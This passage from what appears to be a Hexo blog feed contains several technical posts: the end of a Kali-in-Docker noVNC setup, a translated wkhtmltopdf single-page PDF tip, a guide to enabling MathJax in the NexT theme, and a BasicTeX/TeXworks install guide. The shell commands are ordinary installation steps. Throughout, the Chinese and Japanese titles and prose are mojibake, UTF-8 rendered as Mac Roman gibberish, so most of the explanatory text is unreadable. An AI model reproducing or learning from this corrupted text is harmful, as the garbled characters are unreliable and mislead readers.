bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/novnc/utils/launch.sh --listen 5901 --vnc localhost:5900</span><br></pre></td></tr></table></figure><p>then access http://127.0.0.1:25901/vnc.html through your browser and your will get into noVNC, and setting the WebSocket <code>Host</code> to <code>127.0.0.1</code> and <code>Port</code> to <code>25901</code> so that we can connect to VNC server. The password was the one you set when running <code>vncpasswd</code>.</p><img src="/tech/run-kali-in-docker-and-install-desktop-environment-and-vnc/2.gif" class="" title="access through web broswer(noVNC WebSocket)"><h1 id="reference">reference</h1><ul><li><span class="exturl" data-url="aHR0cHM6Ly93d3cucG9mdHV0LmNvbS9ob3ctdG8taW5zdGFsbC1hbmQtYWNjZXNzLXRpZ2h0dm5jLXJlbW90ZS1kZXNrdG9wLWluLWxpbnV4Lw==">How To Install and Access TightVNC Remote Desktop In Linux<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvbmV3cy9tYWpvci1tZXRhcGFja2FnZS1tYWtlb3Zlci8=">Major Metapackage Makeover<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cua2FsaS5vcmcvZG9jcy9nZW5lcmFsLXVzZS9ub3ZuYy1rYWxpLWluLWJyb3dzZXIv">Kali In The Browser (noVNC)<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vc2V0LXVuc2V0LWVudmlyb25tZW50LXZhcmlhYmxlcy1pbi1saW51eC8=">ÂΩì Kali ÈÅáËßÅ Docker<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NkaWh2YWkvYXJ0aWNsZS9kZXRhaWxzLzEwMzgyMjQ5OCNWTkNfMTI=">„ÄêÂ§áÂøòÂΩï„ÄëÊ†ëËéìÊ¥æÂÆâË£ÖKali LinuxÂπ∂ÂÆâË£ÖVNC<i class="fa fa-external-link-alt"></i></span></li><li><span class="exturl" data-url="aHR0cHM6Ly9xaWl0YS5jb20vcm9jaW5hbnRlLWVpbi9pdGVtcy82ODBmMjBkMzdhN2U1MzZkMzA3Yg==">Docker„Çí‰Ωø„Å£„Å¶Kali Linux„ÅÆÁí∞Â¢É„ÇíÊßãÁØâ„Åó„ÅüÊôÇ„ÅÆ„É°„É¢<i class="fa fa-external-link-alt"></i></span></li></ul>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Dev </tag>
            
            <tag> Mac OS </tag>
            
            <tag> Security </tag>
            
            <tag> Tools </tag>
            
            <tag> Setup </tag>
            
            <tag> Docker </tag>
            
            <tag> Kali </tag>
            
            <tag> Pentest </tag>
            
            <tag> VNC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>„ÄêËØë„ÄëÂ¶Ç‰ΩïÂ∞ÜHTMLÊñá‰ª∂ËΩ¨Êç¢‰∏∫ËøûÁª≠ÁöÑÔºàÂçïÈ°µÔºâPDF</title>
      <link href="/tech/how-to-make-a-continuous-pdf-from-a-html-file/"/>
      <url>/tech/how-to-make-a-continuous-pdf-from-a-html-file/</url>
      
        <content type="html"><![CDATA[<ul><li>Author: <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZpYW5hbWFycXVlej9zb3VyY2U9cG9zdF9wYWdlLS0tLS1jNWYwYWRjOTE0ZDktLS0tLS0tLS0tLS0tLS0tLS0tLS0t">Viviana M√°rquez<i class="fa fa-external-link-alt"></i></span></li><li>Translator: dog2</li><li>Source: <span class="exturl" data-url="aHR0cHM6Ly9tZWRpdW0uY29tL0B2aXZpYW5hbWFycXVlei9ob3ctdG8tbWFrZS1hLWNvbnRpbnVvdXMtc2luZ2xlLXBhZ2UtcGRmLWZyb20tYW4taHRtbC1maWxlLWM1ZjBhZGM5MTRkOQ==">How to make a continuous (single page) PDF from an HTML file<i class="fa fa-external-link-alt"></i></span></li></ul><hr /><p>ÔºàËØëÊñá ÂßãÔºâ</p><p>‰Ω†ÊòØÂê¶ÊõæÁªèÂ∞ùËØïËøáÂ∞ÜHTMLÊñá‰ª∂Âè¶Â≠ò‰∏∫PDFÊñá‰ª∂Âπ∂ÂæóÂà∞‰∏Ä‰∏™‰∏ëÈôãÁöÑÊñá‰ª∂Âë¢ÔºüÊàë‰πüÊéâËøáËøô‰∏™Âùë„ÄÇ</p><p>Êú¨ÊñáÂ∞Ü‰ªãÁªçÊ†πÊçÆHTMLÁî®‰∏§Ê≠•ÂàõÂª∫ÊâÄËßÅÂç≥ÊâÄÂæóÁöÑPDFÊñá‰ª∂„ÄÇÔºàÁ¶èÂà©Ôºö‰Ω†ËøòÂ∞ÜÂ≠¶‰π†Â¶Ç‰ΩïÂàõÂª∫ÂçïÈ°µPDF„ÄÇÔºâ</p><a id="more"></a><h1 id="step-1">Step 1</h1><p><img src="https://miro.medium.com/max/1400/1*lJr9kWyKj_QObM7pMRo0fQ.png" /></p><p>ÂÆâË£Ö<span class="exturl" data-url="aHR0cHM6Ly93a2h0bWx0b3BkZi5vcmcvZG93bmxvYWRzLmh0bWw=">wkhtmltopdf<i class="fa fa-external-link-alt"></i></span></p><h1 id="step-2">Step 2</h1><p><img src="https://miro.medium.com/max/1400/1*4-9bQEbUfzetm6erJIhUBA.png" /></p><p>Âú®ÂëΩ‰ª§Ë°åËøõÂÖ•Áõ∏ÂÖ≥ÁõÆÂΩïÂπ∂ËæìÂÖ•Ôºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wkhtmltopdf input.html output.pdf</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠Ôºö</p><ul><li><code>input.html</code>ÂèØ‰ª•ÊòØËÆ°ÁÆóÊú∫‰∏äÁöÑHTMLÊñá‰ª∂ÊàñURL„ÄÇ</li><li><code>output.pdf</code>ÊòØË¶ÅÂú®ÂΩìÂâçÁõÆÂΩï‰∏≠ÂàõÂª∫ÁöÑPDFÊñá‰ª∂ÁöÑÂêçÁß∞„ÄÇ</li></ul><p>‰ªÖÊ≠§ËÄåÂ∑≤ÔºÅSo EasyÔºÅ</p><h1 id="step-3-Á¶èÂà©">Step 3 (Á¶èÂà©)</h1><p>Â¶ÇÊûúÂá∫‰∫éÊüêÁßçÂéüÂõ†‰Ω†ÂèØËÉΩÊÉ≥Ë¶ÅÂàõÂª∫ËøûÁª≠ÁöÑÔºàÂçïÈ°µÔºâPDFÔºåËÄå‰∏çÊòØÂ§öÈ°µÁöÑPDFÔºåÊ≠§Êó∂ÈúÄË¶Å‰ª•‰∏ãÂëΩ‰ª§Ôºö</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wkhtmltopdf -T 0 -B 0 --page-width 210mm --page-height 3861mm input.html output.pdf</span><br></pre></td></tr></table></figure><p>ÂÖ∂‰∏≠Ôºö</p><ul><li><code>-T 0 -B 0</code> Ë°®Á§∫ÊñáÊ°£‰∏≠ÊØèÈ°µÈ°∂ÈÉ®ÂíåÂ∫ïÈÉ®Ê≤°ÊúâÁ©∫ÁôΩ„ÄÇ</li><li><code>--page-width 210mm</code> ÊòØA4ÊñáÊ°£ÁöÑÊ†áÂáÜÂÆΩÂ∫¶Ôºà‰ΩÜÊòØ‰Ω†ÂèØ‰ª•Ê†πÊçÆÈúÄË¶ÅËøõË°å‰øÆÊîπÔºâ„ÄÇ</li><li><code>--page-height 3861mm</code>ÊòØ‰Ω†Â∞ÜÊ†πÊçÆÈúÄË¶ÅË∞ÉÊï¥ÁöÑÊñáÊ°£È´òÂ∫¶„ÄÇÂØπ‰∫éÊ≠§ÂèÇÊï∞ÔºåÊàëÂª∫ËÆÆ Êñá‰ª∂‰∏≠ÁöÑÈ°µÊï∞‰πò‰ª•297ÔºàA4ÊñáÊ°£ÁöÑÊ†áÂáÜÈ´òÂ∫¶Ôºå‰ª•mm‰∏∫Âçï‰ΩçÔºâ„ÄÇ</li></ul><p>üòä‰Ω†ÂÆåÊàê‰∫ÜÔºÅÊÑüË∞¢‰Ω†ÁöÑÈòÖËØªÔºÅ</p><p>üëèÂ¶ÇÊûúÂØπ‰Ω†ÊúâÁî®ÔºåËØ∑ÁªôÊàëÈºìÂ£∞ÔºöÔºâ</p><h1 id="ÂÖ≥‰∫éÊàë">ÂÖ≥‰∫éÊàëÔºö</h1><p>ÊóßÈáëÂ±±Â§ßÂ≠¶Êï∞ÊçÆÁßëÂ≠¶Á°ïÂ£´ËØæÁ®ãÂ≠¶Áîü„ÄÇ</p><p><span class="exturl" data-url="aHR0cDovL3ZpdmlhbmFtYXJxdWV6LmNvbS8=">www.VivianaMarquez.com<i class="fa fa-external-link-alt"></i></span></p><p>ÔºàËØëÊñá ÂÆåÔºâ</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> PDF </tag>
            
            <tag> Tips </tag>
            
            <tag> Tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ËÆ©Hexo Next (v8.0.0) ÊîØÊåÅLaTeXÊï∞Â≠¶ÂÖ¨Âºè</title>
      <link href="/tech/making-hexo-next-theme-latex-math-equation-supported/"/>
      <url>/tech/making-hexo-next-theme-latex-math-equation-supported/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Making Hexo Next v8.0.0 Theme LaTeX Math Equation Supported</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Êåâ">Êåâ</h1><ul><li>ÁéØÂ¢É<ul><li>OSÔºöMax OS 10.15</li><li>node: 13.7.0</li><li>hexoÔºö4.2.1</li><li>hexo-cli: 3.1.0</li><li>hexo-theme-next: v8.0.0-rc.2</li></ul></li><li>ÈúÄÊ±ÇÔºöËÆ©hexoÁöÑnext‰∏ªÈ¢òÊîØÊåÅÊ∏≤ÊüìLaTeXËØ≠Ê≥ïÁöÑÊï∞Â≠¶ÂÖ¨Âºè„ÄÇ</li><li>ÂèÇËÄÉÈìæÊé•Ôºö<ul><li><span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL3RoaXJkLXBhcnR5LXNlcnZpY2VzL21hdGgtZXF1YXRpb25zLmh0bWw=">ÂÆòÊñπÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></li></ul></li></ul><a id="more"></a><h1 id="Ê≠•È™§">Ê≠•È™§</h1><p>Ê†πÊçÆÂÆòÊñπÊñáÊ°£ÔºåËÆ©Next‰∏ªÈ¢òÊîØÊåÅÂÖ¨ÂºèÊúâÊúâ‰∏§ÁßçÊñπÂºèÔºàÊó†Ê≥ïÊ≠£Â∏∏Ê∏≤ÊüìËØ∑Âà∑Êñ∞È°µÈù¢ÔºâÔºö</p><pre class="mermaid" style="text-align: center;">graph LRH[Hexo] ==> |‰∏ªÈ¢ò| T(NexT)T ==> |ÂÖ¨ÂºèÊ∏≤ÊüìÂºïÊìé1| MJ{MathJax}T -.-> |ÂÖ¨ÂºèÊ∏≤ÊüìÂºïÊìé2| KT{KaTeX}style KT text-decoration:line-throughMJ ==> |markdownÊ∏≤ÊüìÂºïÊìé1| PD(hexo-renderer-pandoc)MJ -.-> |markdownÊ∏≤ÊüìÂºïÊìé2| KR(hexo-renderer-kramed)MJ -.-> |ÂåñÂ≠¶ÂÖ¨ÂºèÊèí‰ª∂| MC((mhchem))KT -.-> |markdownÊ∏≤ÊüìÂºïÊìé1| MDIP(hexo-renderer-markdown-it-plus)KT -.-> |markdownÊ∏≤ÊüìÂºïÊìé2| MDI(hexo-renderer-markdown-it)KT -.-> |ÂÖ¨ÂºèÂ§çÂà∂Êèí‰ª∂| CPTEX((Copy-tex))KT -.-> |bug| KTBUG>Ëß£Êûê$ÊúâBugÈúÄÊâãÂä®‰øÆÂ§ç]</pre><p>ÊàëÁöÑÊµãËØï‰∏≠Âè™Êúâ‰∏äÂõæ‰∏≠ÁöÑÂÆû‰ΩìÁ≤óÁ∫øÁöÑÊñπÂºèÊàêÂäüÔºåËøôÈáåÂ∞±ËÆ∞ÂΩï‰∏Ä‰∏ãËøôÁßçÊñπÂºèÁöÑÊ≠•È™§ÔºåÂç≥</p><ul><li>NexT =&gt; MathJax =&gt; hexo-renderer-pandoc</li></ul><ol type="1"><li><p>ÂÆâË£Ö<span class="exturl" data-url="aHR0cHM6Ly9wYW5kb2Mub3JnL2luc3RhbGxpbmcuaHRtbA==">pandoc<i class="fa fa-external-link-alt"></i></span></p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install pandoc</span><br></pre></td></tr></table></figure></p></li><li><p>Â∞ÜÈªòËÆ§ÁöÑmarkdownÊ∏≤ÊüìÂºïÊìé<code>hexo-renderer-marked</code>ÊõøÊç¢‰∏∫<code>hexo-renderer-pandoc</code></p><p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm un hexo-renderer-marked</span><br><span class="line">npm i hexo-renderer-pandoc</span><br></pre></td></tr></table></figure></p></li><li><p>‰øÆÊîπnext‰∏ªÈ¢òÈÖçÁΩÆ</p><p><div class="note warning"><p>NextÁöÑÈÖçÁΩÆÊñá‰ª∂ÔºåÊúâ2ÁßçÂΩ¢ÂºèÔºåËØ∑ÂèÇËÄÉ<span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9kb2NzL2dldHRpbmctc3RhcnRlZC9jb25maWd1cmF0aW9u">ÂÆòÊñπÊñáÊ°£<i class="fa fa-external-link-alt"></i></span></p></div></p><p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Math Formulas Render Support</span></span><br><span class="line"><span class="attr">math:</span></span><br><span class="line"><span class="comment"># Default (true) will load mathjax / katex script on demand.</span></span><br><span class="line"><span class="comment"># That is it only render those page which has `mathjax: true` in Front-matter.</span></span><br><span class="line"><span class="comment"># If you set it to false, it will load mathjax / katex srcipt EVERY PAGE.</span></span><br><span class="line"><span class="attr">per_page:</span> <span class="literal">true</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-renderer-pandoc (or hexo-renderer-kramed) required for full MathJax support.</span></span><br><span class="line"><span class="attr">mathjax:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">true</span></span><br><span class="line">    <span class="comment"># See: https://mhchem.github.io/MathJax-mhchem/</span></span><br><span class="line">    <span class="attr">mhchem:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># hexo-renderer-markdown-it-plus (or hexo-renderer-markdown-it with markdown-it-katex plugin) required for full Katex support.</span></span><br><span class="line"><span class="attr">katex:</span></span><br><span class="line">    <span class="attr">enable:</span> <span class="literal">false</span></span><br><span class="line">    <span class="comment"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class="line">    <span class="attr">copy_tex:</span> <span class="literal">false</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="attr">vendors:</span></span><br><span class="line">  <span class="comment"># MathJax</span></span><br><span class="line">  <span class="attr">mathjax:</span> <span class="string">//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js</span></span><br></pre></td></tr></table></figure></p><p><code>per_page</code>ÊåâÈúÄËÆæÁΩÆÔºåÂÖ∑‰ΩìÂèØÂèÇËÄÉÊ≥®ÈáäÂíåÂÆòÁΩëËØ¥Êòé„ÄÇÂÖ∂‰ªñÈÄâÈ°πÈúÄË¶ÅË∑ü‰∏äËø∞ËÆæÁΩÆ‰øùÊåÅ‰∏ÄËá¥„ÄÇ</p></li></ol><h1 id="ÊµãËØïÊï∞Â≠¶ÂÖ¨Âºè">ÊµãËØïÊï∞Â≠¶ÂÖ¨Âºè</h1><p>‰ª£Á†ÅÊù•Ëá™NexTÂÆòÁΩëÔºåMathjaxÊ∏≤ÊüìÁöÑÂÖ¨ÂºèÂ∑≤ÁªèÂÜÖÁΩÆ‰∫Ü‰∏∞ÂØåÁöÑÂè≥ÈîÆËèúÂçïÔºåÂèØ‰ª•Â§çÂà∂ÂÖ¨Âºè‰ª£Á†Å„ÄÇ</p><h2 id="ÁÆÄÂçïÂÖ¨Âºè">ÁÆÄÂçïÂÖ¨Âºè</h2><p>Â∏¶labelÁöÑÂÖ¨Âºè</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span> <span class="tag">\<span class="name">label</span><span class="string">&#123;eq1&#125;</span></span></span></span><br><span class="line"><span class="formula">e=mc^2</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><p><span class="math display">\[\begin{equation} \label{eq1}e=mc^2\end{equation}\]</span></p><p>Ê†πÊçÆlabelÂºïÁî®‰∏äËø∞ÂÖ¨Âºè</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The famous matter-energy equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq1&#125;</span></span>$</span> proposed by Einstein...</span><br></pre></td></tr></table></figure><p>The famous matter-energy equation <span class="math inline">\(\eqref{eq1}\)</span> proposed by Einstein...</p><h2 id="Â§öË°åÂÖ¨Âºè">Â§öË°åÂÖ¨Âºè</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;equation&#125;</span></span> <span class="tag">\<span class="name">label</span><span class="string">&#123;eq2&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">begin</span><span class="string">&#123;aligned&#125;</span></span></span></span><br><span class="line"><span class="formula">a &amp;= b + c <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">  &amp;= d + e + f + g <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">  &amp;= h + i</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;aligned&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;equation&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><p><span class="math display">\[\begin{equation} \label{eq2}\begin{aligned}a &amp;= b + c \\  &amp;= d + e + f + g \\  &amp;= h + i\end{aligned}\end{equation}\]</span></p><p>ÂºïÁî®‰∏äËø∞Â§öË°åÂÖ¨Âºè</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq2&#125;</span></span>$</span> is a multi-line equation.</span><br></pre></td></tr></table></figure><p>Equation <span class="math inline">\(\eqref{eq2}\)</span> is a multi-line equation.</p><h2 id="Â§öË°åÂ§öÁºñÂè∑ÂÖ¨Âºè">Â§öË°åÂ§öÁºñÂè∑ÂÖ¨Âºè</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span></span><br><span class="line"><span class="formula">a &amp;= b + c <span class="tag">\<span class="name">label</span><span class="string">&#123;eq3&#125;</span></span> <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">x &amp;= yz <span class="tag">\<span class="name">label</span><span class="string">&#123;eq4&#125;</span></span><span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula">l &amp;= m - n <span class="tag">\<span class="name">label</span><span class="string">&#123;eq5&#125;</span></span></span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><p><span class="math display">\[\begin{align}a &amp;= b + c \label{eq3} \\x &amp;= yz \label{eq4}\\l &amp;= m - n \label{eq5}\end{align}\]</span></p><p>ÂºïÁî®‰∏äËø∞Â§öË°åÂÖ¨Âºè</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">There are three aligned equations: equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq3&#125;</span></span>$</span>, equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq4&#125;</span></span>$</span> and equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq5&#125;</span></span>$</span>.</span><br></pre></td></tr></table></figure><p>There are three aligned equations: equation <span class="math inline">\(\eqref{eq3}\)</span>, equation <span class="math inline">\(\eqref{eq4}\)</span> and equation <span class="math inline">\(\eqref{eq5}\)</span>.</p><h2 id="Êó†ÁºñÂè∑ÂÖ¨Âºè">Êó†ÁºñÂè∑ÂÖ¨Âºè</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$<span class="tag">\<span class="name">begin</span><span class="string">&#123;align&#125;</span></span></span></span><br><span class="line"><span class="formula">-4 + 5x &amp;= 2+y <span class="tag">\<span class="name">nonumber</span></span>  <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula"> w+2 &amp;= -1+w <span class="tag">\<span class="name">\</span></span></span></span><br><span class="line"><span class="formula"> ab &amp;= cb</span></span><br><span class="line"><span class="formula"><span class="tag">\<span class="name">end</span><span class="string">&#123;align&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><p><span class="math display">\[\begin{align}-4 + 5x &amp;= 2+y \nonumber  \\ w+2 &amp;= -1+w \\ ab &amp;= cb\end{align}\]</span></p><h2 id="Áî®tagÊåáÂÆöÁºñÂè∑ÊñáÂ≠ó">Áî®\tagÊåáÂÆöÁºñÂè∑ÊñáÂ≠ó</h2><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="formula">$$x+1<span class="tag">\<span class="name">over</span></span><span class="tag">\<span class="name">sqrt</span><span class="string">&#123;1-x^2&#125;</span></span> <span class="tag">\<span class="name">tag</span><span class="string">&#123;i&#125;</span></span><span class="tag">\<span class="name">label</span><span class="string">&#123;eq_tag&#125;</span></span>$$</span></span><br></pre></td></tr></table></figure><p><span class="math display">\[x+1\over\sqrt{1-x^2} \tag{i}\label{eq_tag}\]</span></p><p>ÂºïÁî®‰∏äËø∞ÂÖ¨Âºè</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Equation <span class="formula">$<span class="tag">\<span class="name">eqref</span><span class="string">&#123;eq_tag&#125;</span></span>$</span> use `<span class="tag">\<span class="name">tag</span><span class="string">&#123;&#125;</span></span>` instead of automatic numbering.</span><br></pre></td></tr></table></figure><p>Equation <span class="math inline">\(\eqref{eq_tag}\)</span> use <code>\tag{}</code> instead of automatic numbering.</p>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blog </tag>
            
            <tag> Hexo </tag>
            
            <tag> Hexo Next </tag>
            
            <tag> Tech </tag>
            
            <tag> LaTeX </tag>
            
            <tag> Math </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Áî®BasicTeXÂèäTeXworksÊûÑÂª∫ËΩªÈáèLaTexÂÜô‰ΩúÁéØÂ¢É</title>
      <link href="/tech/building-a-lightweight-latex-environment-with-basictex-and-texworks/"/>
      <url>/tech/building-a-lightweight-latex-environment-with-basictex-and-texworks/</url>
      
        <content type="html"><![CDATA[<ul><li>Title(EN): <em><strong>Building A Lightweight LaTeX Environment with BasicTeX and TeXworks</strong></em></li><li>Author: dog2</li></ul><hr /><h1 id="Êåâ">Êåâ</h1><ul><li>ÁéØÂ¢ÉÔºöMax OS 10.15</li><li>ÈúÄÊ±Ç =&gt; Ëß£ÂÜ≥ÊñπÊ°à<ul><li>ËΩªÈáèÔºöTeX LiveÂ§™Èáç =&gt; Áî®Á≤æÁÆÄÂëΩ‰ª§Ë°åÁâà<code>BasicTeX</code>Êõø‰ª£</li><li>ÁÆÄÂçïÔºö‰ªÖÁºñÂÜôÂÖ¨ÂºèÂèäÁâπÊÆäÊÉÖÂÜµ‰∏ãÁöÑÁÆÄÂçïÂÜô‰Ωú =&gt; ÊûÅÁÆÄTeXÁºñËæëÂô®<code>TeXworks</code></li></ul></li></ul><a id="more"></a><h1 id="ÁéØÂ¢ÉÂÆâË£Ö">ÁéØÂ¢ÉÂÆâË£Ö</h1><h2 id="ÂÆâË£Öbasictex">ÂÆâË£ÖBasicTeX</h2><p><span class="exturl" data-url="aHR0cHM6Ly90dWcub3JnL21hY3RleC9tb3JlcGFja2FnZXMuaHRtbA==">BasicTeX<i class="fa fa-external-link-alt"></i></span>ÊòØ<code>TeX Live</code>ÁöÑMac OSÁâàÊú¨<code>MacTeX</code>ÁöÑÁ≤æÁÆÄÁâàÔºåÂâçËÄÖ80MBÔºåÂêéËÄÖÂ•ΩÂá†GB„ÄÇ<code>BasicTex</code>Âè™ÊúâÊ†∏ÂøÉÁöÑTeXËØ≠Ê≥ïÁºñËØëÁöÑÂëΩ‰ª§Ë°åÂ∑•ÂÖ∑Ôºå‰∏çÂåÖÂê´GUIÁ®ãÂ∫è„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install basictex</span><br></pre></td></tr></table></figure><p>ÂÆâË£ÖÂÆåÊàêÂêéÂ∞±ÂèØ‰ª•‰ΩøÁî®<code>TeX Live</code>ÁöÑÂåÖÁÆ°ÁêÜÂëΩ‰ª§<code>tlmgr</code>Êù•ÁÆ°ÁêÜTeXÁöÑÂåÖ(ÂÆèÈõÜ)‰∫Ü„ÄÇ</p><p>‰ΩøÂàöÂàöÂÆâË£ÖÁöÑ<code>tlmgr</code>ÂëΩ‰ª§Âú®ÂΩìÂâçshellÁîüÊïà</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">eval</span> <span class="string">"<span class="variable">$(/usr/libexec/path_helper)</span>"</span></span><br></pre></td></tr></table></figure><p>Êõ¥Êñ∞ÂÜÖÁΩÆÊâÄÊúâTeXÂåÖ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlmgr update --self --all</span><br></pre></td></tr></table></figure><h2 id="ÂÆâË£Ötexworks">ÂÆâË£ÖTeXworks</h2><p><span class="exturl" data-url="aHR0cDovL3d3dy50dWcub3JnL3RleHdvcmtzLw==">TeXworks<i class="fa fa-external-link-alt"></i></span>ÊòØ‰∏ÄÊ¨æÊûÅÁÆÄÁöÑTeXÂõæÂΩ¢ÁºñËæëÂô®„ÄÇ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew cask install texworks</span><br></pre></td></tr></table></figure><h2 id="ÂÆâË£Öctex-ÂÆèÈõÜ‰ª•ÊîØÊåÅ‰∏≠Êñá">ÂÆâË£ÖCTeX ÂÆèÈõÜ‰ª•ÊîØÊåÅ‰∏≠Êñá</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tlmgr install ctex</span><br></pre></td></tr></table></figure><h2 id="‰Ω†Â•Ωworld">‰Ω†Â•ΩÔºåworld</h2><p>ÊâìÂºÄ TeXworksÔºåÈÄâÊã©<code>XeLaTeX</code>‰Ωú‰∏∫ÊéíÁâàÂ∑•ÂÖ∑ÔºåÁºñËØëÊâßË°å</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">\<span class="name">documentclass</span><span class="string">[UTF8]</span><span class="string">&#123;ctexart&#125;</span></span></span><br><span class="line"><span class="tag">\<span class="name">begin</span><span class="string">&#123;document&#125;</span></span></span><br><span class="line">‰Ω†Â•ΩÔºåworld!</span><br><span class="line"><span class="tag">\<span class="name">end</span><span class="string">&#123;document&#125;</span></span></span><br></pre></td></tr></table></figure><figure><img src="1.png" 